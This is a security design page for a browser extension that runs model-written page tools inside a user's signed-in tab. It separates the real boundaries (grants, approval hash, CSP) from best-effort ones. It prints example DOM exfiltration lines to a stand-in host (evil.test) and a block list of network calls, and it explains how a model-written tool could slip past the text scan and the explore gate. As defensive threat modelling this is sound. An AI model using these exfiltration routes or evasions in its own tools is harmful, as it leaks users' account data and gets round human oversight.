# Safety model for page tools

A page tool runs a model-written function inside the user's real, signed-in tab. This page says what actually protects the user and what does not.

## The scan is not a boundary

`src/mint/page-gate.ts` is a text scan. It catches mistakes and obvious misuse (`fetch`, `XMLHttpRequest`, `sendBeacon`, `eval`, `window[...]`, string timers, and so on). It cannot stop a determined author, because JavaScript has too many ways to reach the same capability. A page tool can always send data out through the DOM, and none of these is caught:

- `document.createElement("img" | "script" | "iframe").src = "https://evil.test/?" + data`
- `form.submit()` on a form the tool builds
- `el.insertAdjacentHTML("beforeend", '<img src="https://evil.test/?...">')`

Do not describe the scan as a sandbox, in docs or in the UI.

## What actually protects the user

1. **Per-site grant.** The extension only touches origins the user granted with "Allow this site". No grant, `SITE_NOT_GRANTED`.
2. **Explore window.** Draft runs, snapshots, explore and capture work only while the user has opened a 15 minute explore window for that origin. `explore` runs arbitrary code with `page` and is not gated by `mint_effect`, so in a read mint it could click Save: that gate on `act` is a convention, not a boundary. Guides and the reviewer say explore must not change state.
3. **Per-version approval, bound to the code.** A published tool version runs only after the user clicks Approve in the popup. The extension computes the approval hash itself: sha256 of a canonical form of `{source, world, urlPattern, origins, signin, needsVisible}`. It ignores any hash the requester sends. Changing the code, world, URL pattern, origins, sign-in check or visibility changes the hash and asks again. The popup shows the first 12 characters, as does the `NEEDS_APPROVAL` message, so the user can compare them.
4. **Network CSP on the USER_SCRIPT world.** `sw.js` calls `chrome.userScripts.configureWorld({csp: "connect-src 'none'; script-src 'self'"})` on every worker start. Checked in Chrome for Testing: `fetch` from the page's own origin succeeds before the call and fails (`TypeError: Failed to fetch`) after it, but only in documents created after the call; tabs already loaded keep the old world until reloaded. `world: "MAIN"` is not covered, which is why it needs a reviewer note.

5. **Hard-target safeguards** (generic, for bot-sensitive signed-in sites). `needsVisible` refuses a tab that is not the active tab of a focused window (`TAB_HIDDEN`; an unreadable window fails closed). `minIntervalSec` is enforced by the runtime from a record in `<home>/state/last-run.json` (`TOO_SOON`, nothing sent to the site; an unreadable record fails closed; offline capture runs are exempt). Every run checks the page for a challenge before the tool, after it and when it throws (`CHALLENGE`): the run stops, is never retried, counts as a visit for the interval, and a mint with a challenge in a live run may not spend any more live runs. Publishing a `hardTarget` tool needs `minIntervalSec` >= 60.

## Limits to keep in mind

- `minIntervalSec` and `hardTarget` are enforced by the runtime, not the extension, so they are not in the approval hash. The interval record is the user's own file; it stops loops and retries, not someone who edits it. A run counts from the moment it is dispatched (failures after that still count; failures before the page is reached, such as no tab or not approved, give the slot back), concurrent calls cannot all pass, and a tool's draft live runs and its published runs share one interval.
- The challenge check is a tripwire on the page's path, captcha frames and title or headings. A site can block in ways it cannot see.
- The `wm` helpers (`extension/page-helpers.js`) are not part of the approval hash. Approval binds the tool's code and scope; a helper change ships with an extension update, which the user installs.

- Approval is only as good as the user's reading of the tool. The popup shows name, version, site and hash, not the code.
- The CSP stops fetch-style requests from the USER_SCRIPT world, not DOM-based exfiltration (above).
- Any process running as the same OS user can talk to the 0600 bridge socket. That is why approval is computed and checked in the extension, not trusted from the request.

## Writes (effect "write")

A write tool changes something on a site. The boundary, outermost first:

1. **Grant and approval.** Page write tools run only on a site the user allowed in the extension popup, and only for a version
   the user approved. For write tools the approval hash also covers the helper text (`wm.fill`, `wm.handOff`).
2. **Explicit start.** `act` and saving a write tool need `mint_effect({ effect: "write" })`. A read mint cannot change anything.
3. **Prompt every time.** `act` and every saved write tool carry `destructiveHint: true`, so Claude Code asks before each run.
   (Whether a blanket allow rule skips that prompt is an open question; a PreToolUse hook returning `ask` is the fallback.)
4. **Rehearsal by default.** Every write tool has an automatic `dryRun` input, default true. `wm.commit` skips its callback;
   `wm.handOff` returns at once. Tests and the publish gate run only as dry runs.
5. **One commit place.** Browser tools save only inside `wm.commit(mark, fn)`; marks are declared in `tool.json` and a
   passing case must reach each one before publish. Page tools never press the final control: the user does, after
   `wm.handOff`. The static scan is best-effort: it refuses `click`/`submit`/`requestSubmit` as any name (including optional calls, destructuring and `.call`), `dispatchEvent`, `.prototype` access and string-literal computed keys, but JavaScript can be obfuscated further. The reviewer checks the same things as a second layer; the user pressing Save is the only boundary.
6. **Honest results.** Every write result carries `committed` and `possibleCommit`. A run killed or failed inside a commit
   reports `possibleCommit: true`. The runtime never retries a write, and a write that reached the page keeps its interval slot.
7. **No hard targets.** Write tools are refused on a `hardTarget` site.

## Hard targets and site terms

A hard target is a site that actively resists automation or is sensitive to unusual traffic. The safeguards in item 5 above (visible tab, minimum interval, challenge stop) are there to keep a tool from behaving like a bot loop. They are not a way around a site's defences, and a challenge stops the run instead of being solved.

Terms of service: many sites forbid automated access or scraping. This project does not decide that for you. A tool you mint runs as you, on your account, so you are responsible for whether using it is allowed. Prefer an official API where one exists, keep intervals long, and do not point a tool at a site whose terms forbid it. Nothing here grants permission to access anything.

## What is and is not a boundary

| Boundary (enforced by something the model cannot operate) | Not a boundary (best effort or convention) |
|---|---|
| Per-site grant and per-version approval, clicked by the user in the extension popup | The static scan in `page-gate.ts` |
| The approval hash, computed in the extension | `mint_effect` on `explore` |
| Network CSP on the USER_SCRIPT world (fetch-style requests only) | The reviewer's verdict |
| Origin route guard in the browser runner | The off-origin URL text scan |
| The user pressing the final Save on a write | Guides telling the minter to behave |
| Runtime `minIntervalSec`, refusing writes on hard targets | The user's own interval record against someone who edits it |
